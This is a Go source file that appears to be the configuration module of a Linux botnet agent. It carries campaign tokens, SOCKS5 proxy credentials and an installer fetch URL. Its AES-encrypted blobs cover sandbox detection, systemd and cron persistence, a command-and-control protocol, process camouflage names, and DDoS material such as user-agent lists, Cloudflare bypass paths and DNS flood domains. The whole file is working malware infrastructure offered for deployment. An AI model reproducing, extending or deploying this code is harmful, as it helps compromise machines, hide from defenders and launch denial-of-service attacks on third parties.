package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "72d88258" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "pdxZ44GL3p4kV@mY" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "v5.9.11" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("076c66eda1d7fc1001d86da54190545e885826db6f21b6c3cd638ac433f44b4b7930d87e8e96d553d558c3e7") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("6f5b7503a6bec2bce90cf13453c7fecb9a7b756d8fd06a967f6f5846ec7e538d302ad9bbf78bba46938771c5cf190d193c2bb30d97b3ec9873ac3524e6be9a2d4e199f7e0bd271cf0be63e907cac3b8e4130a5682e8a59ab823a50b2e229fdfd007bb6557817eee1be8b425a41a6bb08bf5e243dad")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("f58a5eb1ac3c13f06cc98b03d6ffcd2f830509d87a71ddcec98da8f3c5fb0614e82d0e3df9fefafd7a2e1430d8e335a4509c68cb966670ffad1b1e736435531188439784440333a3cb6e")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("7a995914b62491e42649ca35621abbd37d6449047416fdab82222c73a9bc8c44")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("153a5e7a74623915852593bb377e61657a9ef3f2e77e6e8df981e055c0")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("2c626b2ca95e092bcb7f1f8f29de6fc428ccc754d45c45bb6c0be247589a43c548e2b52313")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("25e594dd4235c103363df8e2fdb469457a28db405d90565b67f9215850c0e9")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("2c040bc37c354d8f505938b66a0848845dec11af5cae176346848ab77b")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("75931fe23b9b5c9afaf0e54fced0ba7319628efe1c97bcce0f93791e331c6638f9dd7e155146d181e720f83da1bbec124c489fcdcfebc5")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("20ae231af852ab58de923a5e6f07bf0dd6e58fa566203456d73f2664bd747455e97a9d")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("c50cd90db2f9df1f3687abb1350817a2b4c934826872a081400ef829cc7b41eb468bbcf359cf5680dd6e8c1beaedce5f3a650e11e6260ead0b88a3304936cda1c34d45614a3a90593a16ebd3689a73c99cc77556d564d259ecaf28eae11ccca1283d5e4db7d83a46f6b5bc9f5ccd5decd2d9a9b29f2a9a42bd8f35d7fdfe0a741a1b466c7cb8774b78cdccdde71e237d26f9ee7365248a5385cd0f3162e3ff8d9eab8a9831ffbb74777818b9275dd37edade5031b57e91ebdc33abb7f7cb061cb1c0f2d4c69c54527b2a0124501850")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("d6a897047dcb40c61cdd38aea42af0884a8d936a02c035776aada40bc7d51e1f2479eadd04b8512ee51f15316b97ee8659fcd498c9d334b81b7a2489d0ec6f53ecac2f0a69998ee5e3717d231346d057f5236dbc2d7b4d20441beee5be0fe8e374506a5575d8fb90b45d7ff103405d9ac6727e61341dd126bc6733f0b04557d46b465368d9948f0e2a4dee69e9e72fd869f48b65a4d87f9c937c7e6e287ff33079beb0157e8c58a18adc17e842cb20fd45ac5040667ecbc7101a0b5301281560277d592d7686")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("875f69fcc2455b5ef90765912afd52f7215fcb287c77befe98")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("407c7508cf16a57cc1f061161b931a2b3a4734b723e09e5061d2f0b557")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("2550c39528dc0ada599d63ddfd88514f6d442ce31635e71ec0efc39366548fb969b61885f24320")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("60375f6bfd456a28ca25d50d04d9a3921493e2710dfd917a150b4aa630ff90b1c450fc6a64096562b17efd")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("fb8d9384f44349a3f9107f66eef2f9d6a2abdbfed3ad05d9e3f3f2b7292054")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("113d91235502d5c8cda8998f4151bfdf6d5408ea8d6897bec21b1b3f")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("94980d18e19f774da591df27ad651ff067cadf06bba1c642f4ac00752e4ea054127f04c9f471268a83bff0b29a41e573")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("b9d75e78c9b0a26fe3637a3aaf936d7ed6131f2d")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("2e0976d49d6b394e7c2bfc887cf2bbd2f838d58cc9")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("9fc80c2d2bbb8dc33fb68a9008f3acfb76df2b8fb7f9c25da614594a1aa8cd")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("39d849f080a04ff4bb50c15de48cedee35c3839180575915211d")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("4bb4f115ef128e3af64cec0c03906259520ed38dafaa58abe17562")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("bab9e2eb62f7a8ae6ce8148e1cea25368c4dc93e48769061b26655")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("ba6c3ead17f161ba8de0826f02b08e69b135abc3a860d23537f7a2ecfc9613")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("49be5eec43e6a672e7e36eff306b4f18e6c83b36b9135ab052d21b862248f5d2a633964f15f87a3772ec6131b85e6be907ee0b5afd")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("bd69fb96a16426c387d14b2bf5e3821e4f0db25cbc7bae4529")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("482c4924ea75b056357c627d7a8225f5403ffb95809b8c8655735be9d05b9b550492")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("3069165c620928a4305acbb9339d840280d97a2408153d509d68057463b6c32bc3fc0dd497da828b2de4b5f72b1a")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("246c4834ca09aa25e55362d3d1134b64c86dd81dd843b63e44f4af5ae83d6791b6a3c86af3fe2730c52ab088")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("9da6491cbadbc31b2024e5592fa0b53a94c1d0bb4f911ca3cc80237106337edb9aa5ed47bc11470a7703b94dac2de21034fbfcbbaf88220ac1a9")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("54df614618aedcf4ba1ffadb036eb032ed2c4e9deb99471120f37181f3b89c70")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("5b5b7d8e2aa54afd7649807f05af671b54196a95b0921c051c1945865611bd3986ddd3a7998e4e27a0c922852d24c65e")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("826b05133d68e5bb39d995769349250c2f40ac5467fd4f44dcf150c14c99e52975900585cc")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("b6a847f8d59e64d83b103bb421b512d3939d31c86a0a983a7f7e39a1760dd32992e4f43916461e5b676e74584ecfe7")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("c8b6707bef39f169e205426399a9e2ee48f8d6a196f25daf9893da4f7954aa6407243e673f7af08f5db61f336a9210905d43fb7642c9e080f9be3c3245c867f80ce8deb4f3e083d2e09fab188600a19936c63d46ed12f562dc53889bcf2f4e0b3d9361cb5d504ea6b7fd18f69c1644fc4e")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("20f09f8a8bd771408471c4b8067af62521c1f8093920be61c23ca40f76797b80b802c5597b3858179db95c35ae143e3af816c4049186aa520c092c951140c6735af7fa36e2d36d50926a4e5c59af8bfbe5")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("2ae436217ec85d4445e08bbfef7fcbbc73c96f64bdaf9eb33ebe3c4401d4faac396156c170e31bf9482f6b01b17bc7ba05bfd6548aa52d16dedfb8f956d00a28815861053ee31b960a51ed4be15c")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("e6369c72b0b92fd855c36b309394d32a11f65f8d93bc45ec98cb4a2b4fcba7149f669f57eb72c3d9bfa4bcf6ebc5e5d460ddea650e30ba472a3495e660f82be42829a4676a31efac1ad74a30d9")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("5b04b8c9012b019bd54855b5c5bd5647322acf962e49c909c57a7e3493c018a84995261aab6f319da94e5f750a815b056aeddf46fc86f2566295faec184e3f")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("c8dff203ac8d35dea0865638a6829226761bed2ecd00b24833cc78071b65f1091d5f236b")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("cf69daf5efc9ec82259e0cb1cc80988337c3c51cab667c4f3dba04be2932f3385bcd6a9b9c1c0e65e6191f88352748b52bf7a29152e55eca74f5d82b7c6db9a9116760b21272c9f3073e5e0b966d8c2cd33ce188424460cb3a32ff30b24709827f92e4dc0921bc32fc5dc96abaf0ce205455aa0a8853cad54e83a807ac90e4c66c7384f7ca9d35470a2a9a9abc496d1a59e4c09f5130f4a86df5355bd869bbbc8882464324fd5dda668912c2e93e4cf34d69a9b29e89823fda02fb0b96afbd8812877cf630c9071fb8f32302eecec5dc6fe30aef568e7d7e4ed0726be1")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("e1c507bf450dd6d8c25abf0a4925f38819c39479f0e3836d7742ec77a4bb397af1bb08bf23887f8f490d07073e30b68a59762041cbe4c7c1ea16c0f4042ae92228d5e9d2ec82da125979fe168d19a4a479853cc8a33e5f8acb3c9b")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("ab05f9b015526e25c37f12165ae92b11dd4b842c080f361b4bc97cc1b678dd66c228836ce6a69ca8a6e58556d3af33fcf8b1f622dfaa2d61ba6470")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("37a12bb03bac8764a3257442c4b2e2c99dbcf591bfb375370b2498a5d76967e35ac097803bf67802d5cb8810124db98e557ad3874a89faef729b26949600c2a88b49508f523e85b2b9")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("8744cbdf5834a2bcc3a24466ff3b8dc77c9855cd6dbe08")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("d2aa5709446ce7adce552d523f7a99ac4332959e07f1df4e385813de9a30b7fe6507")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("a878eb69369eabc0648fdb9fd2c072101e0f4f3a79a1c125b8dda3ca420a11ac03035fc8ae44225f29491f52de90d820373f48978897b84e58a6c41be1e495682bd85ac7deed72c46684bf6e252f88774fdb0ea2f4894d7d728b9d4e45f28a")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("84b13a35a46394b84c00c1c552284a2997ea")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("33d19cd5a75820faee4a7d0e714cc5c489bc0a217553b3235709ff240a77bc28279cb4af528b913f0c63c7d8d25280322b7255f878")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("3187604f3bce91fb6c2b3625e2751886880e")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("ae0f95b97e43a345a87130441c5aeb01ba61")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("9f87b4475cb2a6bfb54a66c4b129d572595da8bbf97d")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("f12b827cdc2606c09e1b37f1b70d86a0e7a3a34eccac9afc")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("26a3f6f18d01e4605b00ba4d515ad8453d6aa1321f")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("6bc210a5095eb8f087dc3b80cd4e8fc07a97")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("ddc3a8460225e383ffee671957a094f7a729888ea76a7f980f")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("3ee184561280df3a1d20b79a12c3ddb36f8c450c67868415f7")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("7f0972ab7e68a53776c90e2ef80bf3d3090346f53a80d8")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("f76d852a7aa5ae9dbe6ad2b0726b3e597a05877c")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
